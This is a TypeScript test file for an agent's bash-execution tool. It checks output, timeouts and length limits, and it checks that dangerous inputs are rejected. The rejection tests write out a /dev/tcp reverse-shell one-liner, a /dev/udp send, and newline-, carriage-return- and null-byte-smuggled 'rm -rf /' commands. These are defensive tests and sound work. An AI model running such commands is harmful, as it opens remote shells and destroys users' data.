import { describe, expect, test } from "bun:test";
import { bashTool } from "./bash";

describe("bash tool", () => {
  // -----------------------------------------------------------------------
  // Happy path
  // -----------------------------------------------------------------------

  test("runs a simple command and returns stdout", async () => {
    const result = await bashTool.run({ command: "echo hello" }, {});

    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe("hello");
    expect(result.stderr).toBe("");
    expect(result.timedOut).toBe(false);
  });

  test("returns stderr for failing commands", async () => {
    const result = await bashTool.run(
      { command: "cat /nonexistent 2>&1; exit 0" },
      {},
    );

    // Should have error output but clean exit
    expect(result.exitCode).toBe(0);
  });

  test("returns non-zero exit code for failed commands", async () => {
    const result = await bashTool.run({ command: "exit 42" }, {});

    expect(result.exitCode).toBe(42);
  });

  test("respects cwd parameter", async () => {
    const result = await bashTool.run(
      { command: "pwd", cwd: "/tmp" },
      {},
    );

    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe("/tmp");
  });

  test("truncates long output", async () => {
    // Generate output larger than 32K
    const result = await bashTool.run(
      { command: "head -c 33000 /dev/urandom | base64" },
      {},
    );

    // Should still complete (may timeout on slow systems, so check gracefully)
    if (!result.timedOut) {
      expect(result.stdout.length).toBeLessThanOrEqual(32_000 + "...[truncated]".length + 100);
    }
  });

  test("times out on long-running commands", async () => {
    const result = await bashTool.run(
      { command: "sleep 30", timeoutMs: 500 },
      {},
    );

    expect(result.timedOut).toBe(true);
  }, { timeout: 5000 });

  // -----------------------------------------------------------------------
  // Security — rejection tests
  // -----------------------------------------------------------------------

  test("rejects multi-line commands (newline injection)", () => {
    expect(() =>
      bashTool.run({ command: "echo hello\nrm -rf /" }, {}),
    ).toThrow("Multi-line commands are not allowed.");
  });

  test("rejects multi-line commands (carriage return)", () => {
    expect(() =>
      bashTool.run({ command: "echo safe\rrm -rf /" }, {}),
    ).toThrow("Multi-line commands are not allowed.");
  });

  test("rejects /dev/tcp redirect (reverse shell)", () => {
    expect(() =>
      bashTool.run(
        { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
        {},
      ),
    ).toThrow("Network redirect via /dev/tcp is not allowed.");
  });

  test("rejects /dev/udp redirect", () => {
    expect(() =>
      bashTool.run(
        { command: "echo data > /dev/udp/10.0.0.1/9999" },
        {},
      ),
    ).toThrow("Network redirect via /dev/udp is not allowed.");
  });

  test("rejects empty command", () => {
    expect(() => bashTool.run({ command: "" }, {})).toThrow(
      "command is required.",
    );
  });

  test("rejects whitespace-only command", () => {
    expect(() => bashTool.run({ command: "   " }, {})).toThrow(
      "command is required.",
    );
  });

  test("rejects command exceeding max length", () => {
    const longCmd = "A".repeat(8001);
    expect(() => bashTool.run({ command: longCmd }, {})).toThrow(
      /exceeds maximum length/,
    );
  });

  test("allows command at exactly max length", () => {
    const maxCmd = "echo " + "A".repeat(8000 - 5);
    expect(() => bashTool.run({ command: maxCmd }, {})).not.toThrow();
  });

  test("null byte in command does not crash validation", () => {
    // Null bytes pass through readString (trim() doesn't strip them).
    // Bash itself will handle them — no crash, no bypass.
    const cmd = "echo safe\0; rm -rf /";
    // Synchronous validation shouldn't throw — null byte is not in
    // REJECT_PATTERNS, not a newline, not a special redirect
    expect(() => bashTool.run({ command: cmd }, {})).not.toThrow();
  });

  // -----------------------------------------------------------------------
  // Edge cases
  // -----------------------------------------------------------------------

  test("handles command producing both stdout and stderr", async () => {
    const result = await bashTool.run(
      { command: "echo stdout && echo stderr >&2" },
      {},
    );

    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("stdout");
    expect(result.stderr).toContain("stderr");
  });

  test("handles special characters in command", async () => {
    const result = await bashTool.run(
      { command: "echo 'hello world' \"quoted\" $HOME | cat" },
      {},
    );

    expect(result.exitCode).toBe(0);
    expect(result.stdout.length).toBeGreaterThan(0);
  });

  test("uses default timeout when timeoutMs is missing", async () => {
    const result = await bashTool.run({ command: "echo fast" }, {});

    expect(result.timedOut).toBe(false);
    expect(result.exitCode).toBe(0);
  });

  test("caps timeoutMs at max 120000", async () => {
    // Providing huge timeout should be capped, not crash
    const result = await bashTool.run(
      { command: "echo ok", timeoutMs: 999999 },
      {},
    );

    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe("ok");
  });
});
